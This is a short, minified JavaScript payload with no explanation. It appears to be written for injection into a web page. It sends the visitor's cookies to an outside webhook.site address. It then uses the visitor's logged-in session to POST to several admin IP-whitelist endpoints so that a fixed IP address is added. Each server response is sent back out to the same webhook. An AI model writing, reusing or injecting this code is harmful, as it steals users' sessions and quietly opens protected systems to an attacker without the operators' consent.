(function(){
var W="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d";function o(t,d){new Image().src=W+"/h?t="+t+"&d="+encodeURIComponent(String(d).slice(0,300))}o("ck",document.cookie);["/api/ip/add","/api/ip","/api/ip-white/add","/api/whitelist/add","/api/ingress-ip/add"].forEach(function(p){fetch(p,{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:'{"ip":"142.115.72.69"}'}).then(function(r){return r.text().then(function(t){o("W"+p,r.status+t.slice(0,150))})})});
})();
